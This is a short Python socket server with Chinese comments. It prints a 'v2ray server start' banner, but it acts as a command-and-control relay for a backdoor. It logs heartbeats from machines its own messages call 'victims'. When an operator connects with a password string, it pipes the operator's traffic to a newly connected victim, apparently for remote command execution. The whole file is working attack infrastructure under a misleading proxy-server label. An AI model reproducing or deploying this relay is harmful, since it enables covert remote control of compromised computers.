import time

import socket
#声明主机
host = ""
#声明端口号
port = 2233
#创建sock套接字
sock = socket.socket()
#绑定主机和端口
sock.bind((host, port))
#开始监听
sock.listen(5)
#对话循环

print("v2ray server start！")
all_time = ""

while True:
	try:
		#堵塞连接
		cli, addr = sock.accept()
		print("\n\n客户端接入！")
		print(addr)

		#接收模式识别
		mod = cli.recv(2048).decode()

		#模式为验证更新
		if mod == "i will go to die":
			cli.sendall("stop".encode())
			print("受害者心跳接入！")
			print(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()))

			all_time = str(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()))
			
		if mod == "i'm your father":
			cli.sendall(all_time.encode())
			
			cli.recv(2048).decode()
			cli2, addr = sock.accept()
			cli2.sendall("受害者已接入".encode())
			cli.sendall("受害者已接入".encode())

			while True:
				a = cli.recv(2048).decode()
				cli2.sendall(a.encode())
				b = cli2.recv(2048).decode()
				cli.sendall(b.encode())



	except:
		print("a")

